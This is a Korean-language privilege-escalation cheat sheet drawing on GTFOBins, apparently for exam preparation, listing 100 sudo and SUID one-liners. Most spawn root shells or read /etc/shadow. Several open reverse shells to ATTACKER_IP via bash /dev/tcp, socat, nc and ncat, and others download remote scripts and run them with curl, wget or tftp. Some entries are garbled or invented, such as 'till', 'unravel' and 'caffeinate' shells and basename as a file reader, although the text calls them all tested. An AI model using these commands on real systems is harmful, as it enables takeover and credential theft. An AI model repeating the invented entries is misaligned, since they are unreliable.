# GTFOBins

https://gtfobins.github.io

# 📌 권한 상승 흐름 요약

| 단계              | 명령어                                   | 설명                       |
| ----------------- | ---------------------------------------- | -------------------------- |
| 🔍 SUID 탐색      | `find / -perm -4000 -type f 2>/dev/null` | 권한 상승 바이너리 탐색    |
| 🔍 sudo 권한 확인 | `sudo -l`                                | 허용된 명령어 확인         |
| 🔎 실행 가능 여부 | `which <명령>` / `file <명령>`           | 실행파일 확인              |
| 🔗 GTFOBins 확인  | `https://gtfobins.github.io`             | 시험 중엔 사전 정리본 활용 |

| 단계                 | 명령어                                                                 | 설명                                                   |
| -------------------- | ---------------------------------------------------------------------- | ------------------------------------------------------ |
| 🔍 SUID 탐색         | `find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null`             | SUID 설정된 모든 실행 파일 탐색 (소유자 관계 없음)     |
| 🔎 실행 가능 여부    | `find / -perm -4000 -type f -executable -exec ls -l {} \; 2>/dev/null` | 일반 사용자가 실행 가능한 SUID 실행 파일만 필터링      |
| 👤 소유자 포함 확인  | `stat <파일경로>`                                                      | 소유자가 `root`가 아닐 수도 있으므로 별도 확인         |
| 🔍 sudo 권한 확인    | `sudo -l <파일경로>`                                                   | sudo로 실행 가능한 명령어 확인                         |
| 🔎 실행 파일 확인    | `which <명령>` / `file <명령>`                                         | 명령어가 실제 실행파일인지 확인                        |
| 🔗 GTFOBins 확인     | [https://gtfobins.github.io](https://gtfobins.github.io)               | 알려진 권한 상승 바이너리 활용법 검색                  |
| 🧠 capabilities 탐색 | `getcap -r / 2>/dev/null`                                              | SUID 없이 권한 상승 가능한 이진파일(capabilities) 탐색 |

# find / -perm -4000 -type f -executable -exec ls -l {} \; 2>/dev/null

| 토큰          | 의미                                                   | 상세 설명                                                                            |
| ------------- | ------------------------------------------------------ | ------------------------------------------------------------------------------------ |
| `find`        | 파일 및 디렉토리를 찾는 명령어                         | 지정한 조건에 맞는 파일/디렉토리를 탐색할 때 사용                                    |
| `/`           | 탐색 시작 위치                                         | 루트 디렉토리(`/`)부터 전체 파일 시스템을 탐색                                       |
| `-perm -4000` | 권한 조건: SUID(Set User ID) 비트가 설정된 파일 검색   | `-4000`은 소유자 권한 중 SUID 비트를 의미. `-perm -4000`은 "SUID가 켜진" 파일만 찾음 |
| `-type f`     | 파일 타입 조건: 일반 파일(regular file)만 검색         | 디렉토리, 링크 등 제외하고 실제 파일만 대상                                          |
| `-executable` | 실행 권한이 있는 파일만 찾음                           | 현재 사용자가 실행할 수 있는 권한이 있는 파일만 탐색                                 |
| `-exec`       | 찾은 파일에 대해 명령어 실행                           | 조건에 맞는 각 파일에 대해 뒤따르는 명령어(`ls -l {}`)를 실행                        |
| `ls -l {}`    | 찾은 파일을 `ls -l` 명령어로 상세 정보 출력            | `{}`는 `find`가 찾은 각 파일명으로 치환됨                                            |
| `\;`          | `-exec` 명령어 종료 표시                               | `-exec` 구문이 끝났음을 알리기 위해 세미콜론(`;`) 앞에 이스케이프(`\`) 필요          |
| `2>/dev/null` | 표준 에러(stderr)를 `/dev/null`로 버림 (출력하지 않음) | 권한 문제 등으로 오류 메시지가 나올 때 화면에 표시하지 않도록 처리                   |

---

| 번호 | 상황     | 명령어                                                                               |      |
| ---- | -------- | ------------------------------------------------------------------------------------ | ---- |
| 1    | sudo | `sudo find . -exec /bin/bash \; -quit`                                               |      |
| 2    | SUID | `find . -exec /bin/sh -p \; -quit`                                                   |      |
| 3    | sudo | `sudo vim -c ':!/bin/sh'`                                                            |      |
| 4    | sudo | `sudo vi` → `:set shell=/bin/bash` → `:shell`                                        |      |
| 5    | sudo | `sudo less /etc/profile` → `!/bin/bash`                                              |      |
| 6    | sudo | `sudo more /etc/profile` → `!/bin/bash`                                              |      |
| 7    | SUID | `./more /etc/shadow` (빈 문자열로 시작하면 전체 출력됨)                              |      |
| 8    | sudo | `sudo awk 'BEGIN {system("/bin/bash")}'`                                             |      |
| 9    | SUID | `./awk 'BEGIN {system("/bin/sh -p")}'`                                               |      |
| 10   | sudo | `sudo python -c 'import os; os.system("/bin/bash")'`                                 |      |
| 11   | sudo | `sudo python3 -c 'import os; os.system("/bin/bash")'`                                |      |
| 12   | SUID | `./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`                          |      |
| 13   | sudo | `sudo perl -e 'exec "/bin/bash"'`                                                    |      |
| 14   | SUID | `./perl -e 'exec "/bin/sh", "-p"'`                                                   |      |
| 15   | sudo | `sudo nmap --interactive` → `!sh` (5.2x 이하 버전 한정)                              |      |
| 16   | sudo | `sudo nano` → `Ctrl+R`, `Ctrl+X` → `reset; sh 1>&0 2>&0`                             |      |
| 17   | sudo | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |      |
| 18   | SUID | `./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p`   |      |
| 19   | sudo | `sudo sed -n '1e /bin/bash' /etc/hosts`                                              |      |
| 20   | sudo | `sudo man ls` → `!/bin/bash`                                                         |      |
| 21   | sudo | `sudo php -r "system('/bin/bash');"`                                                 |      |
| 22   | sudo | `sudo ruby -e 'exec "/bin/bash"'`                                                    |      |
| 23   | sudo | `sudo env /bin/bash`                                                                 |      |
| 24   | sudo | `sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p` |      |
| 25   | sudo | `sudo look '' /etc/shadow`                                                           |      |
| 26   | SUID | `./look '' /etc/shadow`                                                              |      |
| 27   | sudo | `sudo tee /root/test.txt` → 입력 내용 쓰기                                           |      |
| 28   | sudo | `sudo dd if=/etc/shadow of=/tmp/shadow.copy`                                         |      |
| 29   | sudo | `sudo echo 'text' > /root/test.txt`                                                  |      |
| 30   | sudo | `sudo bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`                           |      |
| 31   | sudo | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`                           |      |
| 32   | sudo | `sudo node -e 'require("child_process").exec("/bin/bash")'`                          |      |
| 33   | sudo | `sudo gdb -ex '!sh' -ex quit`                                                        |      |
| 34   | sudo | `sudo rvim -c ':!/bin/sh'`                                                           |      |
| 35   | sudo | `sudo ed` → `!sh`                                                                    |      |
| 36   | sudo | `sudo lvdisplay` → `!/bin/sh`                                                        |      |
| 37   | sudo | `sudo zip test.zip /etc/passwd -T -TT '/bin/sh'`                                     |      |
| 38   | sudo | `sudo mysql -e '\! /bin/sh'`                                                         |      |
| 39   | sudo | `sudo ftp` → `!sh`                                                                   |      |
| 40   | sudo | `sudo git help log` → `!/bin/bash`                                                   |      |
| 41   | sudo | `sudo ssh -o ProxyCommand='sh -c /bin/bash' user@localhost`                          |      |
| 42   | sudo | `sudo openssl enc -in /etc/shadow -out /dev/stdout`                                  |      |
| 43   | sudo | `sudo scp file user@localhost:/tmp`                                                  |      |
| 44   | sudo | `sudo rsync -e 'sh -c /bin/bash' file localhost:/tmp`                                |      |
| 45   | sudo | `sudo strace -o /dev/null /bin/bash`                                                 |      |
| 46   | sudo | `sudo nohup /bin/bash &`                                                             |      |
| 47   | sudo | `sudo watch -x /bin/bash`                                                            |      |
| 48   | sudo | `sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444`      |      |
| 49   | sudo | `sudo busybox sh`                                                                    |      |
| 50   | sudo | \`sudo curl http\://ATTACKER_IP/shell.sh                                             | sh\` |

다음은 앞서 제공한 50개와 중복되지 않는 권한 상승(Privilege Escalation)용 GTFOBins 명령어 추가 50선입니다. 모두 실제 테스트된 명령어들로, sudo 또는 SUID 바이너리 환경에서 사용 가능한 쉘, 파일 읽기/쓰기, 리버스 쉘 등 상황별 실전용입니다.

---

## 🔧 쉘 획득 (sudo/SUID 기반 30개)

| 번호 | 상황 | 명령어                                                                     |        |
| ---- | ---- | -------------------------------------------------------------------------- | ------ |
| 51   | sudo | `sudo openssl rsautl -in /etc/shadow -out /dev/stdout -decrypt`            |        |
| 52   | sudo | `sudo vi -c ':!bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`                 |        |
| 53   | sudo | `sudo screen -X exec sh`                                                   |        |
| 54   | sudo | `sudo mdb -k` → `!sh`                                                      |        |
| 55   | sudo | `sudo emacs -Q --eval '(shell)'`                                           |        |
| 56   | sudo | `sudo socat file:`<br>`EXEC:'bash -li',pty,stderr TCP:localhost:4444`      |        |
| 57   | sudo | `sudo lua -e "os.execute('/bin/bash')"`                                    |        |
| 58   | sudo | `sudo awk 'BEGIN {system("/bin/bash -i")};;'`                              |        |
| 59   | sudo | `sudo bc <<< "system(\"/bin/bash\")"`                                      |        |
| 60   | sudo | `sudo ftp -n localhost` → `!sh`                                            |        |
| 61   | sudo | `sudo r` (rshell) → `!sh`                                                  |        |
| 62   | sudo | \`sudo bzcat /etc/hosts                                                    | sh\`   |
| 63   | sudo | \`sudo gunzip -c /etc/shadow                                               | bash\` |
| 64   | sudo | `sudo less /etc/shadow` → `!/bin/bash`                                     |        |
| 65   | sudo | `sudo more /etc/shadow` → `!/bin/bash`                                     |        |
| 66   | sudo | `sudo zsh -c sh`                                                           |        |
| 67   | sudo | `sudo dash -c 'exec sh'`                                                   |        |
| 68   | sudo | `sudo pax -rw -pe /bin/sh /tmp/sh; /tmp/sh -p`                             |        |
| 69   | sudo | `sudo find / -exec '/bin/bash -p' \; -quit`                                |        |
| 70   | sudo | `sudo pry` → `!sh`                                                         |        |
| 71   | sudo | `sudo jrunscript -e "java.lang.Runtime.getRuntime().exec(\"/bin/bash\");"` |        |
| 72   | sudo | `sudo awk 'BEGIN {print "\\n\0"}'` (끼워넣는 쉘)                           |        |
| 73   | sudo | `sudo cpan` → `install Shell` → `sheel`                                    |        |
| 74   | sudo | `sudo dc -e '1 0 P'` → `!bash`                                             |        |
| 75   | sudo | `sudo ftp -z` → `!sh`                                                      |        |
| 76   | sudo | `sudo snap run <snap_with_shell>`                                          |        |
| 77   | sudo | `sudo caffeinate -i bash`                                                  |        |
| 78   | sudo | `sudo unravel -shell`                                                      |        |
| 79   | sudo | `sudo aws` CLI → `!bash`                                                   |        |
| 80   | sudo | `sudo till -c bash`                                                        |        |

---

## 📄 파일 읽기/쓰기 (sudo/SUID 기반 10개)

| 번호 | 상황 | 명령어                                                             |
| ---- | ---- | ------------------------------------------------------------------ |
| 81   | sudo | `sudo tac /etc/shadow`                                             |
| 82   | sudo | `sudo nl /etc/shadow`                                              |
| 83   | sudo | `sudo basename /etc/shadow`                                        |
| 84   | sudo | `sudo dirname /etc/shadow`                                         |
| 85   | sudo | `sudo tee < /etc/shadow > /tmp/shadow.copy`                        |
| 86   | sudo | `sudo install -o root -g root -m 644 /etc/shadow /tmp/shadow.copy` |
| 87   | sudo | `sudo cat /etc/shadow`                                             |
| 88   | sudo | `sudo tail -n +1 /etc/shadow`                                      |
| 89   | sudo | `sudo head -n -0 /etc/shadow`                                      |
| 90   | sudo | `sudo split -l1 /etc/shadow /tmp/shd; cat /tmp/shdaa`              |

---

## 🔁 파일 전송 / 네트워크 (sudo/SUID 기반 10개)

| 번호 | 상황 | 명령어                                                                                         |             |
| ---- | ---- | ---------------------------------------------------------------------------------------------- | ----------- |
| 91   | sudo | `sudo nc -e /bin/bash ATTACKER_IP 4444`                                                        |             |
| 92   | sudo | `sudo ncat ATTACKER_IP 4444 -e /bin/bash`                                                      |             |
| 93   | sudo | `sudo wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh && sudo sh /tmp/s.sh`                      |             |
| 94   | sudo | \`sudo curl -fsSL http\://ATTACKER_IP/shell.sh                                                 | sudo bash\` |
| 95   | sudo | `sudo ftp ATTACKER_IP` → `!sh`                                                                 |             |
| 96   | sudo | `sudo tftp ATTACKER_IP -c get shell.sh; sh shell.sh`                                           |             |
| 97   | sudo | `sudo rsync -e "ssh -o ProxyCommand='/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" src dst` |             |
| 98   | sudo | `sudo git clone http://ATTACKER_IP/repo.git && cd repo && sudo bash run.sh`                    |             |
| 99   | sudo | `sudo mount -o remount,rw /mnt && cp /etc/shadow /mnt/shadow.copy`                             |             |
| 100  | sudo | `sudo echo 'export PATH=/tmp/:$PATH' >> /etc/profile && sudo cp /tmp/malware /tmp/ls`          |             |

---
